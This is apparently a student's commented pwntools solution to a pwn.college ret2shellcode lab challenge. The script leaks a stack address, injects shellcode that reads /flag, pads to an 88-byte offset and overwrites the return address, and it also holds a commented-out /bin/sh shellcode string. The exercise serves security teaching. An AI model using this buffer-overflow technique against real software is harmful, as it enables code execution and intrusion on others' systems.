# Username: vasanth.vanan (pwn.college dojos)
# Title: Homework challenge for ret2shellcode 

# imported the 'pwntools' library
from pwn import *

# stored the path of the binary in a variable
binary_path = "/challenge/intro_challenge"

# created a ELF object to check the properties of the binary (similar to checksec tool)
elf = ELF(binary_path)

# stored the ELF structure of the binary.
context.binary = elf

# local process is created by passing the path of the binary
p = process(binary_path)

# Optional command to monitor the sent and received bytes
context.log_level = 'DEBUG'

# received a line from the process. This contained the address of a local variable. Address changes everytime because of ASLR.
# I assumed it as 'a' as per the stack table (refer image). 
data = p.recvline()

# splitted the string to get the hex address of the local variable [Example: 0x7fffffffe3cc]
addr = data.split()[-1].decode('utf-8')

print(addr) #addr = '0x7fffffffe3cc'

# shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# used the cat function from shellcraft to read the /flag file.
shellcode = asm(shellcraft.cat('/flag'))

# Initially, assigned the shellcode to the payload variable.
payload = shellcode

#print(len(shellcode)) 23

# Calculated the offset for the payload. found through cyclic function from pwn-dbg
offset = 88

# Calculated the remaining bytes to be padded.
rem_buffer = offset - len(shellcode)

# next, appended the remaining bytes to the payload with 'A' characters.
payload += b'A' * rem_buffer

# atlast, appended the address of the buffer. This can be found by a difference of 4 bytes from the local variable. (Refer stack table image)
payload += p64(int(addr, 16) + 4)

print(payload)

# sent the payload to the process.
p.sendline(payload)

# received the flag from the process.
p.recvline()

# printed the flag.
p.interactive()